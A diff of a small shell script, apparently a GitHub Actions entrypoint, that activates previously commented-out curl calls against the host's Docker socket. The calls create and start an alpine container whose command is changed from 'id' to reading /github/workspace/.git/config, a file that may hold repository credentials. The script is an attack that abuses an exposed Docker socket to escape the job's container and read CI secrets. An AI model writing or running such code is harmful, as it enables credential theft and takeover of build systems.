@@ -1,7 +1,7 @@
 #!/bin/sh
 
 echo "docker!"
-: '
+
 curl --unix-socket /var/run/docker.sock http:/v1.34/containers/json
 curl \
     -s \
@@ -16,7 +16,7 @@ curl \
     "http:/v1.34/containers/create?name=kewl" \
     -X POST \
     -H "Content-Type: application/json" \
-    -d '{ "Image": "alpine:latest", "Cmd": [ "id" ] }'
+    -d '{ "Image": "alpine:latest", "Cmd": [ "cat /github/workspace/.git/config" ] }'
     
 curl \
     -s \
@@ -25,13 +25,12 @@ curl \
     -X POST \
     -H "Content-Type: application/json"
 
-hostname
-sleep 15
-curl --unix-socket /var/run/docker.sock http:/v1.34/containers/json
-'
-cat /etc/fstab
-ls 
-ls /github/workspace
+#hostname
+#curl --unix-socket /var/run/docker.sock http:/v1.34/containers/json
+
+
+
+
 
 
 
